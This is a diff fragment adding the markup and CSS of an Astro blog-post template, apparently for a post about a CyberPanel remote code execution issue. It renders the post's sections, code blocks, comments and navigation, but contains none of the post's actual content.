+        <div class="post-card">
+          <div class="intro-bubble">
+            <p class="intro-main" set:html={c.intro}></p>
+            <p class="intro-desc">{c.introDesc}</p>
+          </div>
+
+          <div class="repo-banner">
+            <div class="repo-info">
+              <strong>{c.bannerLabel}</strong>
+              <a href={c.bannerUrl} target="_blank" rel="noopener noreferrer" class="repo-link">
+                {c.bannerUrl} ↗
+              </a>
+            </div>
+          </div>
+
+          <hr class="divider" />
+
+          {c.sections.map((sec) => (
+            <section class="content-section">
+              <h2 class="section-heading">{sec.heading}</h2>
+              {sec.paragraphs.map(p => (
+                <p class="section-paragraph" set:html={p.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')} />
+              ))}
+              {sec.code && (
+                <div class="code-container">
+                  {sec.codeLabel && <div class="code-header">{sec.codeLabel}</div>}
+                  <pre class="code-block"><code>{sec.code}</code></pre>
+                </div>
+              )}
+            </section>
+          ))}
+
+          <!-- Signature Remember Section -->
+          <section class="content-section remember-box">
+            <h2 class="section-heading">{c.remember.heading}</h2>
+            <ul class="remember-list">
+              {c.remember.items.map((item) => (
+                <li class="remember-item">
+                  <span class="remember-dot">🌸</span>
+                  <span class="remember-text" set:html={item.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>')}></span>
+                </li>
+              ))}
+            </ul>
+          </section>
+
+          <section class="content-section conclusion-box">
+            <h2 class="section-heading">{c.closingHeading}</h2>
+            <p class="closing-paragraph">{c.closingText}</p>
+            <p class="closing-callout">{c.closing}</p>
+            <div class="closing-signature">
+              <p>{c.closingSign}</p>
+              <p class="signature-name">{c.signature}</p>
+            </div>
+          </section>
+
+          <section class="comments-wrapper">
+            <CommentsSection client:load postSlug="blog-cyberpanel-rce" currentLang={lang} />
+          </section>
+
+          <BlogNavigation currentSlug="blog-cyberpanel-rce" lang={lang} />
+        </div>
+      </article>
+    </main>
+  </div>
+</Layout>
+
+<style>
+  .blog-post-page {
+    min-height: 100vh;
+    background: var(--bg);
+    color: var(--text);
+    padding-bottom: 5rem;
+  }
+
+  .container {
+    max-width: 900px;
+    margin: 0 auto;
+    padding: 2rem 1.5rem;
+  }
+
+  .back-link {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.5rem;
+    color: #f43f5e;
+    text-decoration: none;
+    font-weight: 600;
+    margin-bottom: 2rem;
+    transition: all 0.2s ease;
+  }
+
+  .back-link:hover {
+    color: #fb7185;
+    transform: translateX(-4px);
+  }
+
+  .post-header {
+    text-align: center;
+    margin-bottom: 2.5rem;
+  }
+
+  .meta-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.4rem;
+    padding: 0.4rem 1rem;
+    background: rgba(244, 63, 94, 0.12);
+    border: 1px solid rgba(244, 63, 94, 0.35);
+    border-radius: 9999px;
+    font-size: 0.875rem;
+    color: #fb7185;
+    margin-bottom: 1rem;
+    font-weight: 600;
+    letter-spacing: 0.02em;
+  }
+
+  .post-title {
+    font-size: 2.25rem;
+    font-weight: 800;
+    line-height: 1.25;
+    background: linear-gradient(135deg, #ffffff 0%, #cbd5e1 100%);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    margin-bottom: 0.75rem;
+  }
+
+  .post-subtitle {
+    font-size: 1.125rem;
+    color: #94a3b8;
+    margin-bottom: 0.75rem;
+  }
+
+  .post-date {
+    display: inline-flex;
+    align-items: center;
+    gap: 0.4rem;
+    font-size: 0.875rem;
+    color: #cbd5e1;
+  }
+
+  .post-card {
+    background: rgba(30, 41, 59, 0.7);
+    backdrop-filter: blur(12px);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 1.5rem;
+    padding: 2.5rem;
+    box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3);
+  }
+
+  .intro-bubble {
+    background: rgba(244, 63, 94, 0.08);
+    border-left: 4px solid #f43f5e;
+    border-radius: 0.75rem;
+    padding: 1.25rem 1.5rem;
+    margin-bottom: 1.5rem;
+  }
+
+  .intro-main {
+    font-size: 1.15rem;
+    font-weight: 600;
+    color: #f8fafc;
+    margin-bottom: 0.5rem;
+  }
+
+  .intro-desc {
+    color: #cbd5e1;
+    line-height: 1.6;
+    font-style: italic;
+  }
+
+  .repo-banner {
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+    padding: 1rem 1.25rem;
+    background: rgba(15, 23, 42, 0.8);
+    border: 1px solid rgba(244, 63, 94, 0.3);
+    border-radius: 0.75rem;
+    margin-top: 1rem;
+  }
+
+  .repo-info {
+    display: flex;
+    flex-direction: column;
+    gap: 0.25rem;
+    overflow: hidden;
+  }
+
+  .repo-info strong {
+    font-size: 0.9rem;
+    color: #f8fafc;
+  }
+
+  .repo-link {
+    color: #fb7185;
+    text-decoration: underline;
+    font-family: monospace;
+    font-size: 0.95rem;
+    word-break: break-all;
+    transition: color 0.2s ease;
+  }
+
+  .repo-link:hover {
+    color: #fda4af;
+  }
+
+  .divider {
+    border: 0;
+    height: 1px;
+    background: linear-gradient(90deg, transparent, rgba(244, 63, 94, 0.3), transparent);
+    margin: 2.5rem 0;
+  }
+
+  .content-section {
+    margin-bottom: 2.5rem;
+  }
+
+  .section-heading {
+    font-size: 1.35rem;
+    font-weight: 700;
+    color: #f8fafc;
+    margin-bottom: 1rem;
+  }
+
+  .section-paragraph {
+    font-size: 1.05rem;
+    line-height: 1.8;
+    color: #cbd5e1;
+    margin-bottom: 1.25rem;
+  }
+
+  .code-container {
+    background: #0f172a;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 0.75rem;
+    overflow: hidden;
+    margin: 1.5rem 0;
+  }
+
+  .code-header {
+    background: rgba(30, 41, 59, 0.8);
+    padding: 0.5rem 1rem;
+    font-size: 0.85rem;
+    font-weight: 600;
+    color: #94a3b8;
+    border-bottom: 1px solid rgba(255, 255, 255, 0.05);
+  }
+
+  .code-block {
+    margin: 0;
+    padding: 1.25rem;
+    overflow-x: auto;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+    font-size: 0.9rem;
+    line-height: 1.6;
+    color: #fb7185;
+  }
+
+  :global(.inline-blog-link) {
+    color: #fb7185;
+    text-decoration: underline;
+    font-weight: 600;
+    transition: color 0.2s ease;
+  }
+
+  :global(.inline-blog-link:hover) {
+    color: #fda4af;
+  }
+
+  .remember-box {
+    background: linear-gradient(135deg, rgba(244, 63, 94, 0.08) 0%, rgba(15, 23, 42, 0.6) 100%);
+    border: 1px solid rgba(244, 63, 94, 0.25);
+    border-radius: 1rem;
+    padding: 2rem;
+  }
+
+  .remember-list {
+    list-style: none;
+    padding: 0;
+    margin: 1.25rem 0 0;
+    display: flex;
+    flex-direction: column;
+    gap: 12px;
+  }
+
+  .remember-item {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    background: rgba(15, 23, 42, 0.6);
+    border: 1px solid rgba(244, 63, 94, 0.15);
+    border-radius: 10px;
+    padding: 12px 16px;
+    font-size: 1rem;
+    line-height: 1.6;
+    color: #e2e8f0;
+    transition: background 0.2s ease, border-color 0.2s ease;
+  }
+
+  .remember-item:hover {
+    background: rgba(244, 63, 94, 0.08);
+    border-color: rgba(244, 63, 94, 0.35);
+  }
+
+  .remember-dot {
+    font-size: 0.9rem;
+    flex-shrink: 0;
+    margin-top: 3px;
+  }
+
+  .conclusion-box {
+    background: rgba(15, 23, 42, 0.6);
+    border: 1px solid rgba(244, 63, 94, 0.2);
+    border-radius: 1rem;
+    padding: 2rem;
+  }
+
+  .closing-paragraph {
+    font-size: 1.05rem;
+    line-height: 1.7;
+    color: #f8fafc;
+    margin-bottom: 1rem;
+  }
+
+  .closing-callout {
+    font-size: 1.05rem;
+    color: #fb7185;
+    font-weight: 500;
+    margin-bottom: 1rem;
+  }
+
+  .closing-signature {
+    margin-top: 1.5rem;
+    font-style: italic;
+    color: #fb7185;
+  }
+
+  .signature-name {
+    font-weight: 700;
+    margin-top: 0.25rem;
+  }
+
+  .comments-wrapper {
+    margin-top: 3rem;
+    padding-top: 2rem;
+    border-top: 1px solid rgba(255, 255, 255, 0.1);
+  }
+
+  @media (max-width: 640px) {
+    .post-title {
+      font-size: 1.75rem;
+    }
+    .post-card {
+      padding: 1.5rem;
+    }
+    .remember-box {
+      padding: 1.5rem 1.25rem;
+    }
+  }
+</style>
